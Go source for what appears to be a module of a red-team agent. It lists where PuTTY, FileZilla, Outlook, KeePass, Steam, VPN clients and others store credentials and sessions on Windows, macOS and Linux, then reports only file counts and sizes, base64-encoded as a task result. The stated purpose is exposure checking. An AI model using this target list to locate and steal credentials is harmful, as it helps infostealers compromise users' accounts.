//go:build linux || windows || darwin
// +build linux windows darwin

package main

// client_exposure_collect enumerates credential/session stores of common
// client applications (Rhadamanthys 1819 / FinalShell 1816): SSH/FTP clients,
// mail clients, password managers, Steam, and VPN configs. It reports a bounded
// exposure map — which clients have material on disk, file counts and sizes —
// and deliberately does NOT read, decrypt or return any secret bytes. That is a
// different power (credential theft / session replay) from "is a session
// sitting on this disk", which is what a red-team exposure check answers.
// Same posture as wallet_collect and messaging_token_collect.

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

const clientExposureMaxFiles = 200

// clientTarget is one application and the relative directories to inspect.
type clientTarget struct {
	label string
	dirs  []string
}

// clientTargets returns known session-store locations per platform, derived
// from home/appdata so the function is pure and testable with a temp dir.
func clientTargets(goos, home, appdata string) []clientTarget {
	add := func(label string, dirs ...string) clientTarget {
		return clientTarget{label: label, dirs: dirs}
	}
	switch goos {
	case "windows":
		return []clientTarget{
			add("PuTTY", filepath.Join(appdata, "PuTTY")),
			add("FileZilla", filepath.Join(appdata, "FileZilla")),
			add("CoreFTP", filepath.Join(appdata, "CoreFTP")),
			add("FlashFXP", filepath.Join(appdata, "FlashFXP")),
			add("SmartFTP", filepath.Join(appdata, "SmartFTP")),
			add("Outlook", filepath.Join(appdata, "Microsoft", "Outlook")),
			add("TheBat", filepath.Join(appdata, "The Bat!")),
			add("eMClient", filepath.Join(appdata, "eM Client")),
			add("Pidgin", filepath.Join(appdata, "Pidgin")),
			add("KeePass", filepath.Join(appdata, "KeePass")),
			add("Steam", filepath.Join(appdata, "Steam")),
			add("NordVPN", filepath.Join(appdata, "NordVPN")),
			add("ProtonVPN", filepath.Join(appdata, "ProtonVPN")),
			add("Windscribe", filepath.Join(appdata, "Windscribe")),
		}
	case "darwin":
		base := filepath.Join(home, "Library", "Application Support")
		return []clientTarget{
			add("FileZilla", filepath.Join(base, "FileZilla")),
			add("Mail", filepath.Join(home, "Library", "Mail")),
			add("Pidgin", filepath.Join(base, "purple")),
			add("KeePass", filepath.Join(base, "KeePass")),
			add("Steam", filepath.Join(base, "Steam")),
		}
	default: // linux
		base := filepath.Join(home, ".config")
		return []clientTarget{
			add("FileZilla", filepath.Join(base, "filezilla")),
			add("Pidgin", filepath.Join(base, "purple")),
			add("KeePass", filepath.Join(base, "keepassxc")),
			add("Steam", filepath.Join(home, ".steam")),
		}
	}
}

// collectClientExposureFrom reports presence + bounded counts/sizes. It never
// opens file contents (only metadata via DirEntry.Info) and never follows
// symlinks. Counts are capped so a huge tree cannot inflate the result.
func collectClientExposureFrom(targets []clientTarget) string {
	var sb strings.Builder
	files := 0
	for _, target := range targets {
		present, count, bytes := false, 0, int64(0)
		for _, dir := range target.dirs {
			info, err := os.Lstat(dir)
			if err != nil || !info.IsDir() {
				continue
			}
			present = true
			_ = filepath.WalkDir(dir, func(path string, d os.DirEntry, walkErr error) error {
				if walkErr != nil || files >= clientExposureMaxFiles {
					return nil
				}
				if d.Type()&os.ModeSymlink != 0 {
					return nil // skip the link only, not the whole directory
				}
				if d.IsDir() {
					return nil
				}
				fi, err := d.Info()
				if err != nil || !fi.Mode().IsRegular() {
					return nil
				}
				files++
				count++
				bytes += fi.Size()
				return nil
			})
		}
		if !present {
			fmt.Fprintf(&sb, "%s\t<not installed>\n", target.label)
		} else {
			fmt.Fprintf(&sb, "%s\t%d files, %d bytes (session material present; contents not read)\n",
				target.label, count, bytes)
		}
	}
	if sb.Len() == 0 {
		return "no client targets for this platform\n"
	}
	return sb.String()
}

func collectClientExposure() string {
	home := walletHome()
	targets := clientTargets(runtime.GOOS, home, os.Getenv("APPDATA"))
	return collectClientExposureFrom(targets)
}

func handleClientExposureCollect(task Task, res *TaskResult) {
	out := collectClientExposure()
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}
